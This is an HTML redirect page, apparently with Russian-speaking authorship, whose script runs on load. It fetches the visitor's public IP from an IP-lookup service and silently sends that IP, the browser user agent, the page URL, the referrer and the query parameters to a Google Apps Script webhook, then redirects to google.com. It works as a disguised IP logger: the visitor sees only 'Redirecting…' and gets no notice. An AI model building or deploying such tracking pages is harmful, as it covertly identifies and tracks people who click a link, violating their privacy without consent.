<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
      Redirecting...
    </title>
  </head>
  <body>
    <p>
      Redirecting…
    </p>
    <script>
      var WEBHOOK_URL = &#34;https://script.google.com/macros/s/AKfycbykhOx6nNgWkw3OpNts4cjdm5sj6tFeKNVc3aySJCJrKieeC-SnMFYMUzzRn-jZN4_4qQ/exec&#34;;
    var TRACK_KEY = &#34;cc_9f3a1b7c_2026&#34;;
    var REDIRECT_TO = &#34;https://www.google.com/&#34;;

    function qs(obj) {
      var s = [];
      for (var k in obj) {
        if (!obj.hasOwnProperty(k)) continue;
        s.push(encodeURIComponent(k) + &#34;=&#34; + encodeURIComponent(String(obj[k])));
      }
      return s.join(&#34;&amp;&#34;);
    }

    function getIPWithTimeout(timeoutMs, cb) {
      var done = false;
      function finish(ip, status) {
        if (done) return;
        done = true;
        cb(ip, status);
      }

      setTimeout(function () { finish(&#34;unknown&#34;, &#34;timeout&#34;); }, timeoutMs);

      fetch(&#34;https://api.ipify.org?format=json&#34;, { cache: &#34;no-store&#34; })
        .then(function (r) { return r.json(); })
        .then(function (j) { finish((j &amp;&amp; j.ip) ? j.ip : &#34;unknown&#34;, (j &amp;&amp; j.ip) ? &#34;ok&#34; : &#34;bad_response&#34;); })
        .catch(function () { finish(&#34;unknown&#34;, &#34;error&#34;); });
    }

    function sendAll(ip, ipStatus) {
      var payload = {
        key: TRACK_KEY,
        ip: ip || &#34;unknown&#34;,
        ip_status: ipStatus || &#34;ok&#34;,
        ua: navigator.userAgent || &#34;&#34;,
        page: location.href,
        ref: document.referrer || &#34;&#34;,
        utm: location.search || &#34;&#34;,
        tag: &#34;PAGELOAD&#34;,
        t: Date.now()
      };

      // 1) sendBeacon POST (главный)
      try {
        if (navigator.sendBeacon) {
          var blob = new Blob([JSON.stringify(payload)], { type: &#34;text/plain;charset=utf-8&#34; });
          navigator.sendBeacon(WEBHOOK_URL, blob);
        }
      } catch (e) {}

      // 2) fallback GET-маячок (на всякий)
      try {
        var img = new Image();
        img.src = WEBHOOK_URL + &#34;?&#34; + qs(payload);
      } catch (e) {}
    }

    function redirectNow() {
      location.replace(REDIRECT_TO);
    }

    (function () {
      // 1 раз на вкладку
      var sentKey = &#34;cc_sent_&#34; + location.pathname;
      if (sessionStorage.getItem(sentKey) === &#34;1&#34;) {
        redirectNow();
        return;
      }
      sessionStorage.setItem(sentKey, &#34;1&#34;);

      getIPWithTimeout(800, function (ip, status) {
        sendAll(ip, status);
        setTimeout(redirectNow, 50);
      });

      // если ipify завис — всё равно отправим и уйдём
      setTimeout(function () {
        sendAll(&#34;unknown&#34;, &#34;fallback&#34;);
        redirectNow();
      }, 1200);
    })();
    </script>
  </body>
  </html>
